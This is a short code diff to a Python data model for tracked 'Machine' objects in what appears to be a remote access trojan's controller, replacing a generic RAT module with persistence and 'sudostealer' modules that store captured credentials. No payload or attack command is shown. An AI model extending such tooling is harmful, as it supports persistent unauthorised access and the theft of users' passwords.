@@ -5,14 +5,21 @@ from glob import glob
 from pydantic import BaseModel
 import orders
 import con
-from modules.rat_module import RatModule
+
+class PersistenceModule(BaseModel):
+	enabled: bool = False
+
+class SudostealerModule(BaseModel):
+	enabled: bool = False
+	credentials: list[str] = []
 
 class Machine(BaseModel):
 	id: str
 	version: int
 	connections: dict[str, list[int]] = {}
 	connected: bool = False
-	modules: dict[str, type[RatModule]] = {}
+	persistence: PersistenceModule = PersistenceModule()
+	sudostealer: SudostealerModule = SudostealerModule()
 
 	async def on_register(self, host):
 		self._register_connection(host)
